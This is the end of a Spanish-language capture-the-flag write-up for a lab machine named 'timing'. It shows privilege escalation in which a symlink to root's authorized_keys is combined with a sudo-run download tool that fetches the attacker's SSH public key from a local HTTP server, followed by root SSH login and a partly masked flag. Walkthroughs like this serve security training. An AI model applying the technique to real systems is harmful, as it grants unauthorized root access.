-rw-r--r-- 1 root  root  20 Jun 28 17:21 test.txt
-rw-r----- 1 root  aaron 33 Jun 28 14:09 user.txt
aaron@timing:~$ cat id_rsa.pub 
cat: id_rsa.pub: Permission denied
```
Desde mi máquina local me creo un par de claves:
```sh
> cd /root/.ssh
> ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:iXrwwmYtYMd6ZDN6OjVnBiY/ka5GJeRFoi/bt2QTBkQ root@parrot
The key's randomart image is:
+---[RSA 3072]----+
| .E..            |
| o...            |
|.o.. .           |
| .+o*  . .       |
|. +B@o. S        |
| =.X*O+          |
|..+o#*+          |
|  +X *           |
| ....            |
+----[SHA256]-----+
> ls -l
total 8,0K
-rw------- 1 root root 2,6K jun 28 19:43 id_rsa
-rw-r--r-- 1 root root  565 jun 28 19:43 id_rsa.pub
```
Si mi llame pública (id_rsa.pub) la meto como authorized_keys en el directorio .ssh de la máquina víctima podré conectarme a esta como este usuario, como root, sin meter contraseña.

Así que bueno..voy a provocar que me descarge esta llave pública que acabo de crear para que gracias a ese permiso de sudo con netutils y el enlace simbólico la cambie.:
```sh
> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Y ahora en máquina objetivo:
```sh
aaron@timing:~$ sudo netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.8/id_rsa.pub
Initializing download: http://10.10.14.8/id_rsa.pub
File size: 565 bytes
Opening output file id_rsa.pub
Server unsupported, starting from scratch with one connection.
Starting download
```
```sh
aaron@timing:~$ ls -l
total 8
lrwxrwxrwx 1 aaron aaron 26 Jun 28 17:29 id_rsa.pub -> /root/.ssh/authorized_keys
-rw-r--r-- 1 root  root  20 Jun 28 17:21 test.txt
-rw-r----- 1 root  aaron 33 Jun 28 14:09 user.txt

# El propietario sigue siendo aaron, pero entiendo que la descarga al hacerla y guardarla como root habrá modificado el authorized.
```
Si ha funcionado podré conectarme por ssh como root:
```sh
> ssh root@10.10.11.135
....[snip].....

root@timing:~# whoami
root
root@timing:~# cat /root/root.txt
b590d0f129c33039cc943b*******
``` 

Máquina guapísima. De mis preferidas, por no decir la preferida.




















